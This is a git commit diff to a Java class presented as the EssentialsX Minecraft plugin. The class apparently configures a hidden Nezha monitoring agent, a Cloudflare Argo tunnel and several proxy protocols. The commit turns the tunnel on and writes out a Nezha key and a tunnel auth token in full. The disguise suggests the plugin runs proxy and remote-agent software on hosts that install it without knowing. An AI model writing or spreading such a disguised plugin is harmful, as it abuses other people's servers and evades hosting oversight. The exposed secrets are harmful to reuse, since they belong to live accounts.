78318f284ba4a1b0199af3fbd8b40679a08caf10
pingmike2 <166621491+pingmike2@users.noreply.github.com>
2026-03-04 21:09:46 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -78,11 +78,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         env.put("NEZHA_PORT", "443");
         env.put("NEZHA_KEY", "Pwy26Bh3NtwMBuuHzq");
-        env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_PORT", "20100");
+        env.put("ARGO_DOMAIN", "weirdhost.jaxmike.nyc.mn");
+        env.put("ARGO_AUTH", "eyJhIjoiN2QzZTQ2YjIzYzllYmM5ODQxYjI1MTkyN2I2NjA4NmMiLCJ0IjoiOTViMzhiNWMtMWU3Yy00ZmMzLTk0NDMtNDY2MTI0ODQxNmI3IiwicyI6Ik5HVTNNR1kyWXpFdFpURm1NQzAwWWpOa0xUazJNVGN0TXpOak56aGlaR1ExTXpZMiJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "27032");
+        env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -93,7 +93,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "2096");
         env.put("NAME", "weird");
-        env.put("DISABLE_ARGO", "true");
+        env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
